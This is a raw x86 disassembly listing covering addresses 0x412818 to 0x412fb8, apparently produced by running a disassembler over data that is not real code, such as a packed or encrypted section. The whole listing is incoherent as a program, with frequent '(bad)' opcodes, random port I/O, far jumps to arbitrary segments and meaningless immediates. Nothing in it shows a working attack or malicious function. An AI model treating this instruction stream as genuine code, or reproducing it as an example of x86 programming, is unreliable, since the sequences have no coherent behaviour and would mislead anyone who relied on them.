  412818:	jge    0x412844
  41281a:	mov    edi,0x66bff4d0
  41281f:	mov    ecx,0xdf9a0fff
  412824:	mov    fs,WORD PTR [esi-0x4a]
  412827:	push   edi
  412828:	inc    ebx
  412829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41282a:	dec    eax
  41282b:	clc    
  41282c:	xchg   esp,eax
  41282d:	das    
  41282e:	pop    esi
  41282f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412830:	pop    ecx
  412831:	mov    ecx,DWORD PTR [edi-0x4f]
  412834:	pusha  
  412835:	mov    bl,0x4c
  412837:	xor    BYTE PTR [ebp+0x13],bl
  41283a:	test   BYTE PTR [ecx+0x1e5c1bc9],bh
  412840:	js     0x4128a3
  412842:	lds    edx,FWORD PTR [esi+0x11fc43fd]
  412848:	fdivr  st(1),st
  41284a:	jne    0x4127d0
  41284c:	or     al,0xfa
  41284e:	(bad)  
  41284f:	imul   ecx,DWORD PTR [edx],0x63
  412852:	ja     0x41287a
  412854:	xchg   ebx,eax
  412855:	shr    DWORD PTR [edx-0x31],0x4d
  412859:	dec    eax
  41285a:	push   0x45de5555
  41285f:	pop    ebx
  412860:	inc    edx
  412861:	pop    esp
  412862:	jbe    0x41285a
  412864:	dec    ebp
  412865:	mov    al,0x89
  412867:	inc    esp
  412868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412869:	std    
  41286a:	fistp  DWORD PTR ss:[edx-0xf]
  41286e:	add    al,0x20
  412870:	cld    
  412871:	jg     0x41285e
  412873:	push   esp
  412874:	jle    0x412854
  412876:	sub    dh,ah
  412878:	mov    edi,ecx
  41287a:	fwait
  41287b:	ins    BYTE PTR es:[edi],dx
  41287c:	inc    ecx
  41287d:	jnp    0x412849
  41287f:	fwait
  412880:	dec    edi
  412881:	add    DWORD PTR [ebx-0x3288ef39],esi
  412887:	push   ecx
  412888:	pop    ecx
  412889:	mov    dl,0xd9
  41288b:	dec    ecx
  41288c:	mov    edi,0xaf216882
  412891:	popa   
  412892:	or     bh,BYTE PTR [edx-0x4f]
  412895:	ret    
  412896:	jmp    0x412870
  412898:	push   eax
  412899:	push   ss
  41289a:	inc    esi
  41289b:	das    
  41289c:	iret   
  41289d:	fwait
  41289e:	in     al,0xa8
  4128a0:	dec    eax
  4128a1:	sahf   
  4128a2:	out    dx,eax
  4128a3:	cwde   
  4128a4:	in     al,0xed
  4128a6:	pushf  
  4128a7:	mov    al,ds:0x6192f322
  4128ac:	dec    eax
  4128ad:	repz enter 0x7e6e,0xfe
  4128b2:	sub    esi,DWORD PTR [edx+0x30644fdc]
  4128b8:	dec    ebx
  4128b9:	jns    0x4128df
  4128bb:	test   esi,edi
  4128bd:	cmp    cl,BYTE PTR [esi+ebx*2+0x346f498]
  4128c4:	mov    esp,0x4ef796d6
  4128c9:	mov    ah,0xe7
  4128cb:	stos   BYTE PTR es:[edi],al
  4128cc:	(bad)  
  4128cd:	repnz adc ebp,DWORD PTR [edx+0x43d365ee]
  4128d4:	rol    ecx,0xbe
  4128d7:	cmc    
  4128d8:	repz push ecx
  4128da:	add    ecx,esp
  4128dc:	ds fs fucomi st,st(0)
  4128e0:	xchg   ebx,eax
  4128e1:	test   al,0x34
  4128e3:	outs   dx,BYTE PTR ds:[esi]
  4128e4:	shl    ebp,1
  4128e6:	pop    edx
  4128e7:	(bad)  
  4128e8:	push   ebp
  4128e9:	out    dx,al
  4128ea:	sbb    edx,edx
  4128ec:	dec    eax
  4128ed:	mov    ds:0x91f92c26,al
  4128f2:	sub    BYTE PTR [esi-0x1e],al
  4128f5:	dec    ecx
  4128f6:	enter  0x712,0x18
  4128fa:	dec    esp
  4128fb:	mov    cl,BYTE PTR [esi-0x18]
  4128fe:	cmp    DWORD PTR [eax-0x51b70b17],edx
  412904:	mov    edi,0x42fe8aec
  412909:	dec    eax
  41290a:	lea    ebp,[ebx-0x25d0ad3a]
  412910:	shl    BYTE PTR [ecx+0x45],1
  412913:	mov    ecx,0x2f5e9f31
  412918:	mov    edx,0xc9e51a4e
  41291d:	mov    DWORD PTR [esi],eax
  41291f:	pop    esi
  412920:	imul   BYTE PTR [ecx-0x2d]
  412923:	stos   DWORD PTR es:[edi],eax
  412924:	push   cs
  412925:	lods   eax,DWORD PTR ds:[esi]
  412926:	push   cs
  412927:	push   ebp
  412928:	push   0x33281066
  41292d:	mov    ecx,0xeda8fcab
  412932:	int    0x93
  412934:	test   DWORD PTR [edi],eax
  412936:	xchg   ecx,eax
  412937:	sub    ebp,DWORD PTR [esi+0x6e]
  41293a:	ret    
  41293b:	aad    0xcd
  41293d:	cmp    bh,dh
  41293f:	sti    
  412940:	add    BYTE PTR [ebp+0x40],cl
  412943:	in     eax,0x34
  412945:	in     eax,0xd1
  412947:	lahf   
  412948:	pop    ss
  412949:	xor    eax,0xe764c20d
  41294e:	mov    esi,0x38e50ccc
  412953:	adc    edx,edx
  412955:	jp     0x412971
  412957:	mov    edx,0x20c256a0
  41295c:	adc    eax,0xc9c812ef
  412961:	mov    al,0xe0
  412963:	loop   0x412908
  412965:	(bad)  
  412966:	push   ss
  412967:	sub    BYTE PTR [ebx],dl
  412969:	and    al,0x9a
  41296b:	jge    0x412907
  41296d:	stos   BYTE PTR es:[edi],al
  41296e:	lea    esi,[edi]
  412970:	or     BYTE PTR [ecx],bh
  412972:	inc    eax
  412973:	pop    ss
  412974:	rol    ch,1
  412976:	xor    DWORD PTR [ecx],esi
  412978:	or     al,0x1f
  41297a:	ret    
  41297b:	mov    eax,ds:0x95d493a0
  412980:	in     al,dx
  412981:	inc    edx
  412982:	xchg   BYTE PTR [ecx],ch
  412984:	rol    DWORD PTR [di-0x24de],0x8a
  41298a:	lea    ebx,[esi-0x1a]
  41298d:	mov    ah,0xfa
  41298f:	jo     0x412971
  412991:	pop    esi
  412992:	mov    dl,0xe1
  412994:	call   0xba8b64e8
  412999:	cmc    
  41299a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299b:	cmp    DWORD PTR [ebx-0x71],edi
  41299e:	out    0x50,eax
  4129a0:	in     al,dx
  4129a1:	mov    esi,0xccbb5a75
  4129a6:	sub    edx,esi
  4129a8:	call   0x7f61:0x7d3bf97a
  4129af:	jnp    0x412957
  4129b1:	and    BYTE PTR [esi+0x3d8c5494],0xfe
  4129b8:	add    al,0xec
  4129ba:	sub    BYTE PTR [esi],0xd
  4129bd:	inc    esi
  4129be:	mov    bh,0x94
  4129c0:	or     eax,DWORD PTR [ecx+0x1f8d361d]
  4129c6:	rcl    dh,1
  4129c8:	push   edx
  4129c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129ca:	dec    ebx
  4129cb:	es mov esi,0xced180d4
  4129d1:	out    0x1a,eax
  4129d3:	or     esi,DWORD PTR [eax]
  4129d5:	jge    0x4129ef
  4129d7:	or     BYTE PTR [edx+0x73],al
  4129da:	or     eax,0xee7ee9a7
  4129df:	adc    al,0x2b
  4129e1:	dec    esi
  4129e2:	or     eax,0xfc5ae483
  4129e7:	cld    
  4129e8:	pop    ebp
  4129e9:	or     eax,0x972c8e83
  4129ee:	push   esi
  4129ef:	xor    eax,0x94a26d80
  4129f4:	and    edx,DWORD PTR [edx-0x3a]
  4129f7:	xchg   DWORD PTR ds:0x63ef58f2,edi
  4129fd:	sti    
  4129fe:	sbb    BYTE PTR ds:0xeb4a49d7,0x20
  412a05:	lods   al,BYTE PTR ds:[esi]
  412a06:	aaa    
  412a07:	loopne 0x4129b3
  412a09:	push   ss
  412a0a:	pop    edi
  412a0b:	add    DWORD PTR [edx-0xf100713],esp
  412a11:	call   FWORD PTR [ebx-0x5d416b98]
  412a17:	in     eax,dx
  412a18:	dec    esp
  412a19:	pop    ebp
  412a1a:	sbb    al,0xb3
  412a1c:	and    BYTE PTR [ebp+0x3e94a474],cl
  412a22:	cli    
  412a23:	in     al,0x91
  412a25:	sub    eax,0x99c2c41b
  412a2a:	or     BYTE PTR [ebp+0x5268ebd3],ch
  412a30:	inc    esi
  412a31:	stos   BYTE PTR es:[edi],al
  412a32:	popf   
  412a33:	push   es
  412a34:	data16 mov cl,0xc0
  412a37:	fisttp QWORD PTR [ecx+0xe]
  412a3a:	inc    eax
  412a3b:	mov    eax,0xd65e4f75
  412a40:	ret    0x3cee
  412a43:	icebp  
  412a44:	push   eax
  412a45:	iret   
  412a46:	adc    BYTE PTR [eax-0x5e681da8],bl
  412a4c:	test   al,0x45
  412a4e:	and    DWORD PTR [ecx],ecx
  412a50:	(bad)  
  412a51:	into   
  412a52:	pop    ebx
  412a53:	jp     0x4129d5
  412a55:	cdq    
  412a56:	adc    eax,0xb9e09b3b
  412a5b:	mov    ah,0x8b
  412a5d:	enter  0x8060,0xf9
  412a61:	cmp    dh,BYTE PTR [esi-0x1d066224]
  412a67:	mov    edx,0x3b05a4d1
  412a6c:	ins    DWORD PTR es:[edi],dx
  412a6d:	int    0xee
  412a6f:	inc    esi
  412a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a71:	inc    edx
  412a72:	sbb    edx,DWORD PTR [esi]
  412a74:	pop    eax
  412a75:	std    
  412a76:	aaa    
  412a77:	lods   eax,DWORD PTR ds:[esi]
  412a78:	stos   DWORD PTR es:[edi],eax
  412a79:	push   0x37bb385c
  412a7e:	push   ss
  412a7f:	lahf   
  412a80:	xchg   dh,ch
  412a82:	adc    al,0x7
  412a84:	ins    DWORD PTR es:[edi],dx
  412a85:	sbb    DWORD PTR [ecx],ebx
  412a87:	inc    esp
  412a88:	mul    BYTE PTR [edi+0x2c]
  412a8b:	pop    edx
  412a8c:	lock jmp 0x44e3:0xca6dacb7
  412a94:	push   esp
  412a95:	and    esi,DWORD PTR [eax-0x34]
  412a98:	cwde   
  412a99:	or     bh,BYTE PTR [ebp-0x22202819]
  412a9f:	mov    eax,0x6717d46a
  412aa4:	mov    bh,0xb0
  412aa6:	pop    esi
  412aa7:	fcom   DWORD PTR [ecx-0x51f2f330]
  412aad:	jnp    0x412a7d
  412aaf:	rcr    DWORD PTR [edi+0x47],1
  412ab2:	cdq    
  412ab3:	mov    edi,ebp
  412ab5:	adc    eax,DWORD PTR [bx+si]
  412ab8:	ror    DWORD PTR [ecx+0x2a],cl
  412abb:	loopne 0x412b03
  412abd:	mov    ch,BYTE PTR [edi-0x37]
  412ac0:	call   0xafb:0x619dcbc8
  412ac7:	scas   eax,DWORD PTR es:[edi]
  412ac8:	and    dl,BYTE PTR [eax-0x31ac9d0f]
  412ace:	mov    al,ds:0x58e8bb2c
  412ad3:	push   edx
  412ad4:	call   0x7b56:0x3e5c8a6
  412adb:	je     0x412b54
  412add:	lahf   
  412ade:	adc    ah,BYTE PTR [edx-0x75]
  412ae1:	pop    ss
  412ae2:	test   DWORD PTR ds:0x42699e9f,ebx
  412ae8:	xor    DWORD PTR [edx],esi
  412aea:	call   0xda96eeab
  412aef:	adc    al,0x81
  412af1:	dec    eax
  412af2:	sub    eax,0x4296da96
  412af7:	iret   
  412af8:	fidivr DWORD PTR [ecx+edi*2-0x75189b55]
  412aff:	adc    DWORD PTR [edx],esi
  412b01:	shr    DWORD PTR [edx-0x68a6d573],0x20
  412b08:	mov    ds:0x8f470325,al
  412b0d:	mov    BYTE PTR [ecx+0x14],bh
  412b10:	xor    DWORD PTR [edx],ebx
  412b12:	std    
  412b13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b14:	stc    
  412b15:	daa    
  412b16:	cwde   
  412b17:	jne    0x412ad3
  412b19:	fstp   QWORD PTR [ecx-0x9]
  412b1c:	mov    ecx,0xaa33349d
  412b21:	adc    DWORD PTR [eax+esi*1-0x58f9b72],esp
  412b28:	cs je  0x412b13
  412b2b:	jmp    0x8be8992a
  412b30:	cli    
  412b31:	mov    ds:0xdc74a4d4,eax
  412b36:	cdq    
  412b37:	(bad)  
  412b39:	sbb    al,0x68
  412b3b:	sbb    DWORD PTR [esi-0x77],ecx
  412b3e:	lea    esi,[edi+edi*4-0x44]
  412b42:	jp     0x412b54
  412b44:	add    ebp,DWORD PTR [edx+ebx*8-0x78650595]
  412b4b:	adc    bh,BYTE PTR [ebp+0x5]
  412b4e:	jge    0x412ade
  412b50:	adc    DWORD PTR ds:0x27c238c0,0xbd27380b
  412b5a:	mov    cl,0x48
  412b5c:	add    DWORD PTR [esi+0x2e],0xfffffff1
  412b60:	(bad)  
  412b61:	mov    edi,0x20ba2d26
  412b66:	mov    al,ds:0x8fdbaaa1
  412b6b:	pop    edi
  412b6c:	jl     0x412bb6
  412b6e:	pop    edx
  412b6f:	pop    ebp
  412b70:	(bad)  
  412b71:	icebp  
  412b72:	inc    ebx
  412b73:	sub    BYTE PTR [ecx+0x1e2ae157],0x99
  412b7a:	(bad)  
  412b7b:	retf   
  412b7c:	and    ebp,DWORD PTR [esi-0x1699e697]
  412b82:	add    ch,dl
  412b84:	jmp    0x412bdf
  412b86:	jp     0x412b32
  412b88:	inc    ebx
  412b89:	mov    gs,edx
  412b8b:	arpl   WORD PTR [esi],ax
  412b8d:	cld    
  412b8e:	retf   0x4843
  412b91:	outs   dx,DWORD PTR ds:[esi]
  412b92:	fadd   DWORD PTR [ebp-0x36]
  412b95:	or     DWORD PTR [edi+edx*1-0x9e8cece],0xfffffff6
  412b9d:	xchg   esp,eax
  412b9e:	lidtd  [ecx-0x15]
  412ba2:	or     eax,0xe11f09e0
  412ba7:	dec    esi
  412ba8:	dec    ebx
  412ba9:	mov    ah,BYTE PTR [esi+esi*2+0x6f]
  412bad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bae:	mov    bl,BYTE PTR [ebx-0x76e036e2]
  412bb4:	and    esi,ebx
  412bb6:	outs   dx,DWORD PTR ds:[esi]
  412bb7:	sbb    DWORD PTR [esi+0x6dcd08ec],esp
  412bbd:	enter  0xf02f,0xe2
  412bc1:	jp     0x412c10
  412bc3:	sub    BYTE PTR [eax],ah
  412bc5:	lods   eax,DWORD PTR ds:[esi]
  412bc6:	sub    DWORD PTR [edx*2+0x1f8caee3],0xffffffa9
  412bce:	jbe    0x412beb
  412bd0:	mov    ds:0xd6066565,eax
  412bd5:	daa    
  412bd6:	sub    ah,dl
  412bd8:	mov    dl,0x8d
  412bda:	mov    al,0xa3
  412bdc:	cmp    BYTE PTR [eax+0x26af96f6],0xef
  412be3:	hlt    
  412be4:	jns    0x412c31
  412be6:	pop    edx
  412be7:	add    DWORD PTR [eax-0x41],ecx
  412bea:	fistp  DWORD PTR [ecx-0x39]
  412bed:	push   ecx
  412bee:	loop   0x412bdf
  412bf0:	sbb    BYTE PTR [edi-0x7e29ebd1],ch
  412bf6:	jmp    0x11f6d44a
  412bfb:	frstor [edi+0x2a]
  412bfe:	out    dx,eax
  412bff:	add    dh,bh
  412c01:	lds    esi,FWORD PTR [eax+0x4e]
  412c04:	int3   
  412c05:	enter  0xd308,0xe5
  412c09:	mov    esi,0xb0d0f6f9
  412c0e:	in     eax,0xec
  412c10:	mov    ds:0x5b670e64,eax
  412c15:	rol    BYTE PTR [edx],0x43
  412c18:	imul   esi,DWORD PTR [eax],0xffffffe7
  412c1b:	push   es
  412c1c:	inc    edi
  412c1d:	mov    esi,0xa3d4dfc7
  412c22:	adc    eax,0x62828e49
  412c27:	pop    ecx
  412c28:	or     DWORD PTR [edi-0x20],0xcdd5caa
  412c2f:	in     eax,dx
  412c30:	jae    0x412bfb
  412c32:	(bad)  
  412c33:	loope  0x412c9a
  412c35:	icebp  
  412c36:	adc    BYTE PTR [edi+0x375c93c6],ah
  412c3c:	inc    edi
  412c3d:	jl     0x412c7d
  412c3f:	cmp    DWORD PTR ds:0xb4d5b68,eax
  412c45:	xor    BYTE PTR [ebp+0xe],al
  412c48:	sbb    ah,bh
  412c4a:	mov    ch,0x17
  412c4c:	pushf  
  412c4d:	mov    eax,ds:0xc46de403
  412c52:	bound  edi,QWORD PTR [ebp+0x15]
  412c55:	pop    ds
  412c56:	mov    edx,DWORD PTR [edi+0x7e35bb78]
  412c5c:	(bad)  
  412c5d:	jns    0x412c0d
  412c5f:	cmp    esi,DWORD PTR [ebx]
  412c61:	lds    esp,FWORD PTR ss:[ecx]
  412c64:	adc    eax,0x14ebab4b
  412c69:	mov    ebp,DWORD PTR [edi-0x54]
  412c6c:	in     al,0xe8
  412c6e:	add    ebx,DWORD PTR [ecx]
  412c70:	jno    0x412c79
  412c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c73:	inc    ecx
  412c74:	jbe    0x412c12
  412c76:	imul   ecx,DWORD PTR [ecx-0x6739a0d6],0x35cabdcf
  412c80:	xchg   esi,eax
  412c81:	fimul  WORD PTR [edx]
  412c83:	inc    edi
  412c84:	adc    dl,dl
  412c86:	sbb    eax,DWORD PTR [ebx]
  412c88:	(bad)  
  412c89:	inc    ebx
  412c8a:	retf   0x36a0
  412c8d:	ds jbe 0x412c25
  412c90:	test   cl,0xab
  412c93:	mov    ebp,0x16bcf146
  412c98:	bound  edx,QWORD PTR [edi]
  412c9a:	out    dx,eax
  412c9b:	in     eax,dx
  412c9c:	dec    esi
  412c9d:	push   es
  412c9e:	push   esi
  412c9f:	ja     0x412c81
  412ca1:	cwde   
  412ca2:	ss xchg esp,eax
  412ca4:	push   ss
  412ca5:	jbe    0x412cce
  412ca7:	sti    
  412ca8:	rol    DWORD PTR [esi+0x4ee794f0],0x9f
  412caf:	mov    eax,ds:0xccce77e5
  412cb4:	push   0x9c50c841
  412cb9:	outs   dx,BYTE PTR ds:[esi]
  412cba:	pop    edx
  412cbb:	out    0xf6,eax
  412cbd:	jmp    0xd078:0x3d24fbc
  412cc4:	cmp    BYTE PTR [ebx-0x770348aa],ch
  412cca:	sbb    cl,bh
  412ccc:	push   ss
  412ccd:	mov    ch,0xc5
  412ccf:	call   0xc8366b18
  412cd4:	inc    esi
  412cd5:	sbb    ecx,DWORD PTR [eax+0x24c91688]
  412cdb:	lods   al,BYTE PTR ds:[esi]
  412cdc:	ret    0x2c8d
  412cdf:	pop    edi
  412ce0:	or     esp,edx
  412ce2:	ins    BYTE PTR es:[edi],dx
  412ce3:	js     0x412c6a
  412ce5:	mov    edx,0xcf8411c
  412cea:	es pop esp
  412cec:	test   BYTE PTR [ebx-0x5d77c0f5],ch
  412cf2:	jl     0x412ceb
  412cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cf5:	adc    DWORD PTR [ecx-0x62],eax
  412cf8:	outs   dx,BYTE PTR ds:[esi]
  412cf9:	mov    DWORD PTR [ecx-0x7e],ebp
  412cfc:	test   eax,0xd56feea4
  412d01:	in     eax,0x28
  412d03:	cld    
  412d04:	je     0x412d7d
  412d06:	sar    BYTE PTR [edi],1
  412d08:	pop    ebp
  412d09:	ja     0x412d61
  412d0b:	adc    BYTE PTR [edx],ch
  412d0d:	jecxz  0x412cba
  412d0f:	or     ebx,DWORD PTR [ebx]
  412d11:	fdivr  st(7),st
  412d13:	ins    BYTE PTR es:[edi],dx
  412d14:	sti    
  412d15:	and    esp,edi
  412d17:	(bad)  
  412d18:	in     al,0x88
  412d1a:	ficomp WORD PTR [ebp-0x6f5ddad2]
  412d20:	out    0x18,al
  412d22:	pop    edi
  412d23:	icebp  
  412d24:	cmp    ebp,ebx
  412d26:	int3   
  412d27:	scas   eax,DWORD PTR es:[edi]
  412d28:	jns    0x412d32
  412d2a:	mov    ebx,0x74d3dff3
  412d2f:	retf   0xfedc
  412d32:	push   ebx
  412d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d34:	loope  0x412d83
  412d36:	jns    0x412d2d
  412d38:	mov    ch,0x2b
  412d3a:	add    dh,al
  412d3c:	sbb    eax,DWORD PTR [edx+eiz*2-0x68]
  412d40:	jecxz  0x412cd9
  412d42:	stos   BYTE PTR es:[edi],al
  412d43:	mov    ecx,0xf033207b
  412d48:	add    al,BYTE PTR [esi]
  412d4a:	jns    0x412ce8
  412d4c:	push   ebp
  412d4d:	sub    dh,bh
  412d4f:	adc    BYTE PTR [ebp+0x59f03e8c],0x3c
  412d56:	int3   
  412d57:	mov    cl,0xba
  412d59:	das    
  412d5a:	ret    0xa79a
  412d5d:	mov    ah,0x34
  412d5f:	in     al,0xa
  412d61:	push   0xde3b4914
  412d66:	xchg   edi,eax
  412d67:	(bad)  
  412d68:	cmp    BYTE PTR [edx-0x17973585],ch
  412d6e:	(bad)  
  412d6f:	fs pop ss
  412d71:	jmp    0xb09a:0xf3eae411
  412d78:	mov    al,0x49
  412d7a:	xacquire xchg BYTE PTR [edi+0x2e363d8d],ch
  412d81:	std    
  412d82:	pop    ebp
  412d83:	fs sbb al,0x4c
  412d86:	cld    
  412d87:	(bad)  
  412d88:	loop   0x412e01
  412d8a:	adc    al,BYTE PTR [edi]
  412d8c:	imul   ecx,eax,0x43864cdb
  412d92:	push   edi
  412d93:	popf   
  412d94:	inc    ebx
  412d95:	sub    DWORD PTR [esi+0x5ed9a96d],edx
  412d9b:	imul   ecx,esi,0x22
  412d9e:	cli    
  412d9f:	adc    al,0x21
  412da1:	popa   
  412da2:	int3   
  412da3:	call   0xd632:0x9f94bff7
  412daa:	aaa    
  412dab:	sub    DWORD PTR [edx],ebp
  412dad:	xor    esi,DWORD PTR [ecx+0x13]
  412db0:	(bad)  
  412db1:	ret    
  412db2:	inc    ebp
  412db3:	mov    edx,0x5ea84d32
  412db8:	and    ecx,edi
  412dba:	jle    0x412e01
  412dbc:	xor    BYTE PTR [esp+eiz*2],cl
  412dbf:	(bad)  
  412dc1:	popa   
  412dc2:	and    DWORD PTR [esi],esp
  412dc4:	push   ds
  412dc5:	hlt    
  412dc6:	(bad)  
  412dc7:	add    BYTE PTR ss:[edx-0x20057b50],cl
  412dce:	loope  0x412dfb
  412dd0:	les    edx,FWORD PTR [esi]
  412dd2:	jg     0x412d5a
  412dd4:	xlat   BYTE PTR ds:[ebx]
  412dd5:	ror    DWORD PTR [edi+0x7a3d37e4],1
  412ddb:	mov    ds:0x35af4243,al
  412de0:	add    esp,DWORD PTR [eax]
  412de2:	aam    0xb8
  412de4:	sbb    bh,bh
  412de6:	jp     0x412d96
  412de8:	outs   dx,BYTE PTR ds:[esi]
  412de9:	(bad)  
  412dea:	push   edx
  412deb:	mov    ds:0xb2a45992,eax
  412df0:	xchg   esi,eax
  412df1:	jae    0x412d7f
  412df3:	sbb    ah,BYTE PTR [ecx+0x61]
  412df6:	scas   al,BYTE PTR es:[edi]
  412df7:	lahf   
  412df8:	adc    eax,0x716063cf
  412dfd:	add    cl,BYTE PTR [ebx+0x10]
  412e00:	dec    esi
  412e01:	mov    ah,0x92
  412e03:	dec    ecx
  412e04:	adc    dh,BYTE PTR [ebx+0x9]
  412e07:	adc    eax,0x4bd95192
  412e0c:	int3   
  412e0d:	nop
  412e0e:	mov    ecx,DWORD PTR [ecx-0x53014876]
  412e14:	mov    al,0x58
  412e16:	ret    0xc4ae
  412e19:	je     0x412dc5
  412e1b:	xchg   esi,eax
  412e1c:	inc    esp
  412e1d:	cmp    al,0xfb
  412e1f:	ja     0x412daf
  412e21:	xlat   BYTE PTR ds:[ebx]
  412e22:	mov    BYTE PTR [ecx+0x69],0xce
  412e26:	icebp  
  412e27:	xor    edi,DWORD PTR [esi+0x35adbbc2]
  412e2d:	int3   
  412e2e:	ss (bad) 
  412e30:	xor    eax,0x44025a65
  412e35:	pop    eax
  412e36:	sub    al,0xfa
  412e38:	pop    esp
  412e39:	xlat   BYTE PTR ds:[ebx]
  412e3a:	dec    edi
  412e3b:	mov    cl,0x1e
  412e3d:	imul   ebp,DWORD PTR [eax-0x6c],0xd19cc5a0
  412e44:	mov    ah,0xb7
  412e46:	js     0x412ddb
  412e48:	or     BYTE PTR [ebx+0x5ab7829e],ah
  412e4e:	adc    DWORD PTR [ebx],0x1be0a603
  412e54:	jnp    0x412ea1
  412e56:	mov    dh,BYTE PTR [ebp+eiz*1+0x60]
  412e5a:	adc    BYTE PTR [eax],bh
  412e5c:	pop    edi
  412e5d:	adc    dh,BYTE PTR [ebx+0x62]
  412e60:	sub    BYTE PTR [edx-0x67],0xa6
  412e64:	nop
  412e65:	xchg   esi,eax
  412e66:	ds das 
  412e68:	(bad)  
  412e69:	jge    0x412e8c
  412e6b:	dec    esi
  412e6c:	test   eax,0x7ac419b5
  412e71:	add    al,0x9d
  412e73:	push   esp
  412e74:	xchg   dx,ax
  412e76:	add    eax,0xb2dbcddb
  412e7b:	inc    ecx
  412e7c:	pop    DWORD PTR [esi+ebp*4-0x771018cb]
  412e83:	lods   al,BYTE PTR ds:[esi]
  412e84:	or     eax,0x1f89aa0c
  412e89:	or     dh,BYTE PTR [edi]
  412e8b:	sahf   
  412e8c:	loop   0x412e6e
  412e8e:	repnz pusha 
  412e90:	adc    bh,bh
  412e92:	or     al,0x95
  412e94:	fidivr WORD PTR [ecx]
  412e96:	add    ch,BYTE PTR [eax]
  412e98:	jecxz  0x412e90
  412e9a:	daa    
  412e9b:	cmp    BYTE PTR [eax+0x3b],bl
  412e9e:	imul   esp,DWORD PTR [esi+0x78],0x88c1c1a0
  412ea5:	jg     0x412e5b
  412ea7:	into   
  412ea8:	rcr    BYTE PTR [eax+0x1c],1
  412eab:	push   ss
  412eac:	push   ss
  412ead:	ror    BYTE PTR [esi-0x1475f9c],0x65
  412eb4:	mov    edx,0x7f01e106
  412eb9:	sub    edi,DWORD PTR [ebx]
  412ebb:	ja     0x412e53
  412ebd:	dec    ebp
  412ebe:	xchg   ecx,eax
  412ebf:	ss stc 
  412ec1:	sbb    ch,BYTE PTR [edx+0x54]
  412ec4:	xor    DWORD PTR [edx],esp
  412ec6:	sbb    esp,DWORD PTR [ebx]
  412ec8:	xchg   cl,dh
  412eca:	mov    eax,ds:0xe9ebbc2e
  412ecf:	stos   DWORD PTR es:[edi],eax
  412ed0:	cld    
  412ed1:	dec    ecx
  412ed2:	or     al,0x23
  412ed4:	les    edi,FWORD PTR ds:[edi+0x773021a3]
  412edb:	cli    
  412edc:	sbb    al,0x1e
  412ede:	in     eax,0xfd
  412ee0:	arpl   WORD PTR [edx],bx
  412ee2:	push   eax
  412ee3:	dec    edx
  412ee4:	scas   al,BYTE PTR es:[edi]
  412ee5:	fst    DWORD PTR es:[edx]
  412ee8:	sub    BYTE PTR [ebp+0x44897b8d],ah
  412eee:	push   0xffffff9e
  412ef0:	les    edx,FWORD PTR [edi]
  412ef2:	aam    0x61
  412ef4:	or     bh,BYTE PTR [eax-0x5d]
  412ef7:	lock and dh,BYTE PTR [ebp+0x7a452235]
  412efe:	aas    
  412eff:	cmp    dl,dl
  412f01:	xchg   ebp,eax
  412f02:	mov    cl,0xa2
  412f04:	xchg   ebx,eax
  412f05:	pop    edi
  412f06:	and    DWORD PTR ds:0xbc8c8445,ecx
  412f0c:	add    DWORD PTR [edx-0x7b7b1961],edx
  412f12:	mov    edi,0x8d7c7a43
  412f17:	call   0x47c9:0x96e13907
  412f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f1f:	out    dx,al
  412f20:	in     eax,0x3c
  412f22:	bound  edx,QWORD PTR [eax-0x66]
  412f25:	inc    eax
  412f26:	cmp    ch,BYTE PTR [eax+0x19]
  412f29:	dec    esp
  412f2a:	mov    WORD PTR [edx],es
  412f2c:	cli    
  412f2d:	jle    0x412eb7
  412f2f:	das    
  412f30:	loopne 0x412f24
  412f32:	xchg   ebp,eax
  412f33:	stos   BYTE PTR es:[edi],al
  412f34:	in     eax,dx
  412f35:	lods   al,BYTE PTR ds:[esi]
  412f36:	fisub  WORD PTR [esi+0x5d]
  412f39:	repz jo 0x412f81
  412f3c:	test   BYTE PTR [ebx],cl
  412f3e:	or     DWORD PTR [ebx+0x5f],edi
  412f41:	mov    bh,0x1c
  412f43:	mov    eax,0x2a0da555
  412f48:	jecxz  0x412f99
  412f4a:	pop    esp
  412f4b:	in     al,dx
  412f4c:	out    dx,eax
  412f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f4e:	and    ebp,DWORD PTR [esi-0x38]
  412f51:	imul   BYTE PTR [edx+ecx*4-0xb0840e8]
  412f58:	xchg   edx,eax
  412f59:	scas   al,BYTE PTR es:[edi]
  412f5a:	shl    BYTE PTR [eax+ebp*8],1
  412f5d:	stos   DWORD PTR es:[edi],eax
  412f5e:	adc    edx,0x655ac7cb
  412f64:	mov    eax,ds:0xd6cb71c2
  412f69:	rol    esp,0x26
  412f6c:	push   edx
  412f6d:	hlt    
  412f6e:	mov    eax,ds
  412f70:	(bad)  
  412f72:	(bad)  
  412f73:	add    BYTE PTR cs:0x81d26db3,dh
  412f7a:	pop    ecx
  412f7b:	pop    edx
  412f7c:	sub    ecx,ebp
  412f7e:	adc    eax,0xda90d428
  412f83:	icebp  
  412f84:	pop    ebx
  412f85:	(bad)  
  412f86:	popa   
  412f87:	cld    
  412f88:	mov    ch,0xab
  412f8a:	jmp    0x412f0d
  412f8c:	mov    ds,WORD PTR [edi-0x1bee37ee]
  412f92:	xor    esi,DWORD PTR [ebx+0x5e]
  412f95:	inc    edi
  412f96:	jb     0x412f30
  412f98:	adc    al,0xdd
  412f9a:	sub    DWORD PTR [eax+ebp*1+0x6a64d99e],esi
  412fa1:	fnstsw WORD PTR [ecx-0xa26d3f1]
  412fa7:	cmc    
  412fa8:	xor    DWORD PTR [esi],eax
  412faa:	sub    BYTE PTR [edx+0x29365c8a],bh
  412fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fb1:	gs push edx
  412fb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fb4:	jns    0x412f5a
  412fb6:	sbb    bl,bl
  412fb8:	sbb    edx,ebx
